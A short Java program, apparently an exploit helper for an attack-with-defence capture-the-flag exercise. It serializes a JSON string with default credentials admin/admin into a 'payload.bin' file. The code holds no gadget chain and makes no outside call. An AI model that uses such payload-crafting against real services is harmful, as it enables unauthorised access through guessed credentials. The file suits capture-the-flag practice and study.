import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;



public class exp {
    public static void main(String[] args) throws IOException {

        String content = "{\"username\":\"admin\",\"password\":\"admin\"}";
        serialize(content);
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("D:/awd/exp/payload.bin"));
        oos.writeObject(obj);
    }
}
